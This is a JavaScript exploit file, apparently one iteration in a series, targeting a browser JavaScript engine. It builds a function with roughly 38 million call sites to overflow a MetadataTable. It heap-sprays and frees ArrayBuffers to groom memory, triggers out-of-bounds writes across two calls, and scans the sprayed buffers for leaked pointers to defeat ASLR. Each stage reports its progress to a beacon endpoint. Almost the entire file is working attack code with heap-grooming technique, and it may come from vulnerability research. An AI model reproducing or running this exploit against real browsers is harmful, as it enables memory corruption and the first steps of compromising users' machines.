// p150i — MetadataTable overflow: pre-spray + immediate execute
//
// Problem with p150e: post-compile spray triggers GC → GC walks 38M metadata
// entries → OOB read → crash BEFORE function can execute.
//
// Fix: spray BEFORE compile. Free alternating buffers to create holes.
// Metadata (100KB) lands in a hole. OOB entries read into surviving spray.
// Execute IMMEDIATELY after compile — zero allocations between compile and call.
//
// Flow:
//   1. Spray 400 x 100KB zeroed ABs
//   2. Free even-indexed → 200 holes for metadata to land in
//   3. Compile function → metadata fills a hole, OOB reads forward into odd ABs
//   4. Call 1 IMMEDIATELY: throw at 960 → entries 894-959 setSeen in spray
//   5. Call 2 IMMEDIATELY: throw at 960 → entries 894-959 linkMonomorphicCall → pointers!
//   6. Scan odd ABs for non-zero data → ASLR leak
//
// Beacon prefix: V150I-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V150I-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  BS('BOOT');

  // ---- PHASE 1: Pre-spray 400 x 100KB zeroed ArrayBuffers ----
  var BUF_SZ = 100096;
  var TOTAL = 400;
  var sprays = new Array(TOTAL);
  var views = new Array(TOTAL);

  for (var i = 0; i < TOTAL; i++) {
    sprays[i] = new ArrayBuffer(BUF_SZ);
    views[i] = new Uint8Array(sprays[i]);
  }
  BS('SPRAY-' + TOTAL);

  // ---- PHASE 2: Free even-indexed → create holes ----
  for (var i = 0; i < TOTAL; i += 2) {
    sprays[i] = null;
    views[i] = null;
  }
  BS('FREED-' + (TOTAL / 2));

  // Verify odd buffers are still zeroed
  var preNZ = 0;
  for (var i = 1; i < TOTAL; i += 2) {
    for (var j = 0; j < views[i].length; j++) {
      if (views[i][j] !== 0) { preNZ++; break; }
    }
  }
  BS('PRE-NZ-' + preNZ);

  // ---- PHASE 3: Compile the 38M op_call function ----
  var N = 38348816;
  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;

  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__p150fn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__p150ok=1;';
  callChunk = null;

  var blob = new Blob(parts, { type: 'application/javascript' });
  BS('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { BS('SCRIPT-ERR'); };
  sc.onload = function() {
    blob = null;
    URL.revokeObjectURL(url);
    BS('COMPILED-' + (window.__p150ok ? 'OK' : 'FAIL'));
    if (!window.__p150ok) return;

    // ---- PHASE 4: Execute IMMEDIATELY — no allocations! ----
    var THROW_AT = 960;
    var mode = 0;
    var cnt = 0;

    function cb() {
      cnt++;
      if (mode === 0) {
        // Call 1: setSeen pass
        if (cnt === 1) BS('C1-M1');
        if (cnt === 894) BS('C1-M894-OOB');
        if (cnt >= THROW_AT) {
          BS('C1-BAIL-' + cnt);
          throw 'bail1';
        }
      } else {
        // Call 2: linkMonomorphicCall pass
        if (cnt === 1) BS('C2-M1');
        if (cnt === 894) BS('C2-M894-OOB');
        if (cnt >= THROW_AT) {
          BS('C2-BAIL-' + cnt);
          throw 'bail2';
        }
      }
    }

    // Call 1: sets seenOnce on all visited entries
    BS('C1-START');
    mode = 0; cnt = 0;
    try { window.__p150fn(cb); } catch (e) {
      BS('C1-THREW-' + cnt);
    }

    // Call 2: linkMonomorphicCall writes pointers to OOB entries
    // NO allocations between call 1 and call 2!
    BS('C2-START');
    mode = 1; cnt = 0;
    try { window.__p150fn(cb); } catch (e) {
      BS('C2-THREW-' + cnt);
    }

    // ---- PHASE 5: Scan odd spray buffers for leaked pointers ----
    BS('SCAN-START');
    var hitBufs = 0;
    var totalNZ = 0;

    for (var i = 1; i < TOTAL; i += 2) {
      if (!views[i]) continue;
      var view = views[i];
      var nz = 0;
      var firstOff = -1;
      for (var j = 0; j < view.length; j++) {
        if (view[j] !== 0) {
          if (firstOff === -1) firstOff = j;
          nz++;
        }
      }
      if (nz > 0) {
        hitBufs++;
        totalNZ += nz;
        if (hitBufs <= 5) {
          BS('HIT-b' + i + '-nz' + nz + '-f' + firstOff);

          // Dump at 112-byte stride
          var dumped = 0;
          for (var entryOff = 0; entryOff + 112 <= view.length && dumped < 6; entryOff += 112) {
            var entryHasData = false;
            for (var c = entryOff; c < entryOff + 112; c++) {
              if (view[c] !== 0) { entryHasData = true; break; }
            }
            if (!entryHasData) continue;
            dumped++;

            // Extract 8-byte pointer values
            var ptrs = '';
            for (var p = 0; p + 8 <= 112; p += 8) {
              var anyByte = false;
              for (var v = 0; v < 8; v++) {
                if (view[entryOff + p + v] !== 0) { anyByte = true; break; }
              }
              if (anyByte) {
                var hex8 = '';
                for (var h = 7; h >= 0; h--) hex8 += hexByte(view[entryOff + p + h]);
                ptrs += '+' + p + ':' + hex8 + ' ';
              }
            }
            BS('E@' + entryOff + '-' + ptrs.trim());
          }
        }
      }
    }

    BS('RESULT-bufs' + hitBufs + '-nz' + totalNZ);

    if (hitBufs > 0) {
      BS('LEAK-FOUND');
    } else {
      BS('NO-LEAK');
    }

    BS('DONE');
  };
  document.head.appendChild(sc);
  sc.src = url;
})();
